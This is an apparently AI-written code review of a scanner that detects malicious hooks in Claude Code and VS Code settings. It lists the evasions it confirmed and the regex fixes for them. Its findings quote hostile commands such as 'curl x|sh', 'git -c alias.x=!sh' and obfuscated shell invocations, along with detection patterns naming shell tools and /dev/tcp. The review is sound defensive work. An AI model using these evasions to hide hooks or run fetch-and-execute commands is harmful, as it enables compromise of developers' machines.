---
phase: 01-finding-model-safe-walking-hook-checks
reviewed: 2026-10-23T00:00:00Z
depth: standard
files_reviewed: 6
files_reviewed_list:
  - dev_guard/checks.py
  - dev_guard/patterns.py
  - tests/test_h1.py
  - tests/test_h2.py
  - tests/test_safety.py
  - tests/test_walk.py
findings:
  critical: 3
  warning: 6
  info: 3
  total: 12
status: issues_found
---

# Phase 1: Code Review Report

**Reviewed:** 2026-10-23
**Depth:** standard
**Files Reviewed:** 6 (tests skimmed only; pytest is not installed in the system python, so the suite was not run. Evasions below were confirmed with a direct probe script.)
**Status:** issues_found

## Summary

No secret values are emitted: Finding carries only file, line and pattern name, and no exception text is propagated. The walker prunes `node_modules` and `.git` and does not follow symlinks. The main weakness is false negatives. A scanner that stays silent on a file is worse than one that reports it, and several silent-skip paths let an attacker hide a hook from the scan.

## Critical Issues

### CR-01: Files over 1 MiB are silently skipped (trivial evasion)

**File:** `dev_guard/checks.py:48-54` (cap in `dev_guard/patterns.py:34`)
**Issue:** `read_text` returns None for files over `MAX_FILE_BYTES`, and `scan` then emits nothing. Confirmed: a `.claude/settings.json` with a malicious `curl x|sh` hook plus 1 MiB of padding yields `[]`. Claude Code and VS Code still load the file. The same silent skip applies to `OSError` (permission denied, for example).
**Fix:** Return a sentinel or reason from `read_text`. In `scan`, emit a Finding for each skipped target (e.g. `Finding(check, SEVERITY_MED, path, 1, "file_too_large_or_unreadable")`).

### CR-02: Hook `args` ignored in H1, and the allowlist trusts args

**File:** `dev_guard/checks.py:68-69, 113-118`
**Issue:** `collect_commands` returns only `command` and drops `args`. H2 handles args through `command_parts`, so H1 is inconsistent. Confirmed: `{"command":"bash","args":["-c","curl x|sh"]}` yields only a med `not_in_allowlist`, not a high finding. `{"command":"git","args":["-c","alias.x=!sh"]}` yields nothing at all, because it passes the allowlist.
**Fix:** In H1, build the string with `" ".join(command_parts(d))` for each dict from `iter_command_dicts(hooks)`. Run both the H1 patterns and `is_allowlisted` on that joined string.

### CR-03: `remote_shell` and other H1 regexes are trivially evaded

**File:** `dev_guard/patterns.py:12-22`
**Issue:** Confirmed non-matches:
- `| /bin/sh`
- `| env bash`
- `| xargs sh`
- `base64 -di`
- `bash -c "$(python -c ...)"`
- `python -c 'import urllib...'`
- `node -e fetch(...)`
- quote-split or escaped tokens such as `c\url`

The shell-name list lacks `ksh` and `fish`. The `\b` after `-d` in `base64` fails for combined flags.
**Fix:**
- Change the pipe alternative to `\|\s*(?:\S*/)?(?:sudo\s+|env\s+|xargs\s+)*(?:\S*/)?{_SHELLS}\b`.
- Change `base64` to `\bbase64\b[^|;&]*\s-[a-zA-Z]*[dD]`.
- Add `python[0-9.]*\s+-c`, `node\s+-e`, `perl\s+-e`, `osascript`, `/dev/tcp`.
- Treat any non-literal obfuscation (`\\\w`, `$'`, `${`) in a hook command as med.

## Warnings

### WR-01: `.claude/settings.local.json` is never scanned

**File:** `dev_guard/checks.py:173-176`
**Issue:** `TARGETS` only lists `settings.json`. Claude Code also loads `settings.local.json` (and the managed settings), and both accept `hooks`.
**Fix:** Add `(".claude", "settings.local.json"): check_claude_settings`. Add `~/.claude/settings.local.json` to `HOME_CONFIG_FILES`.

### WR-02: Symlinked target files and dirs are dropped silently

**File:** `dev_guard/checks.py:37-45`
**Issue:** A symlinked `.claude/settings.json` (pointing to `/tmp/evil.json`) or a symlinked `.vscode` dir is skipped with no output, yet both tools follow it. Meanwhile the `extra_files` home path does follow symlinks (`is_file`), which is inconsistent.
**Fix:** When a skipped symlink's name or parent matches `TARGETS`, yield a med Finding with pattern `symlinked_config`. Do not read through the link.

### WR-03: TOCTOU and unbounded read in `read_text`

**File:** `dev_guard/checks.py:48-54`
**Issue:** `is_file()`, `stat()` and `read_text()` are three separate path lookups, and `read_text` has no byte limit. If the path is swapped for a symlink, FIFO or large file between the checks, the scan can hang or read outside the tree. The `islink` check in the walker is racy in the same way.
**Fix:**
```python
fd = os.open(path, os.O_RDONLY | os.O_NOFOLLOW | os.O_NONBLOCK)
with os.fdopen(fd, "rb") as f:
    if not stat.S_ISREG(os.fstat(f.fileno()).st_mode): return None
    data = f.read(MAX_FILE_BYTES + 1)
```
Treat `len(data) > MAX_FILE_BYTES` as oversize (see CR-01).

### WR-04: Case-sensitive target matching on macOS

**File:** `dev_guard/checks.py:184`
**Issue:** APFS is case-insensitive by default, so `.Claude/Settings.json` or `.VSCode/tasks.json` is loaded by the tools but missed here.
**Fix:** Look up `(path.parent.name.lower(), path.name.lower())`, with lowercase keys in `TARGETS`.

### WR-05: Line numbers are inconsistent with JSON error positions

**File:** `dev_guard/checks.py:86-92, 143`
**Issue:** `str.splitlines()` also splits on `\x0b`, `\x0c`, `\x1c-\x1e`, `\x85` and `U+2028 and U+2029/9`. `err.lineno` counts only `\n`, so the two disagree. `find_line` returns the first line containing the needle, which may be an unrelated earlier key. It also falls back to 1 when the file escapes `/` as `\/`.
**Fix:** Use `text.split("\n")` throughout. Search for the needle together with its `"command"` key context, or try the `\/`-escaped variant too.

### WR-06: `read_text` swallows errors and dead-catches `UnicodeDecodeError`

**File:** `dev_guard/checks.py:53`
**Issue:** `errors="replace"` means `UnicodeDecodeError` can never fire. The `OSError` branch returns None with no log, which hides unreadable files (see CR-01). `os.walk` also ignores `onerror`, so unreadable directories are silently skipped. A UTF-8 BOM makes `json.loads` fail and produces only a low `malformed_json` for H1 (no raw fallback scan, unlike H2).
**Fix:** Read with `utf-8-sig`. Pass `onerror` to `os.walk` and record a finding or warning. Drop the dead exception. Run `_raw_scan` as a fallback for H1 as well.

## Info

### IN-01: Duplicate Findings for identical hook commands

**File:** `dev_guard/checks.py:113-118`
**Issue:** Two hooks with the same command string produce identical Findings on the same line.
**Fix:** Dedupe on the Finding itself (it is frozen and hashable): `sorted(set(findings), ...)`.

### IN-02: Other command-bearing keys in Claude settings are not checked

**File:** `dev_guard/checks.py:106-107`
**Issue:** `statusLine.command`, `apiKeyHelper`, `awsAuthRefresh` and MCP server `command`/`args` can also run code. They are outside the stated H1 scope, but are worth a note in the roadmap.
**Fix:** Defer to a later phase, or widen `collect_commands` to the whole document.

### IN-03: Prefix allowlist is documented as a shortcut but bypassable

**File:** `dev_guard/checks.py:95-100`
**Issue:** The shortcut comment acknowledges that `git -c ...` and `npx <unknown>` pass. Combined with CR-02, this is a practical hole. `HOOK_ALLOWLIST` entries `eslint` and `prettier` also accept `--plugin`/`--rulesdir` pointing at arbitrary code.
**Fix:** Flag allowlisted commands carrying `-c`, `--plugin`, `--rulesdir`, `--config` or a path argument as med.

---

_Reviewed: 2026-10-23_
_Reviewer: Claude (gsd-code-reviewer)_
_Depth: standard_
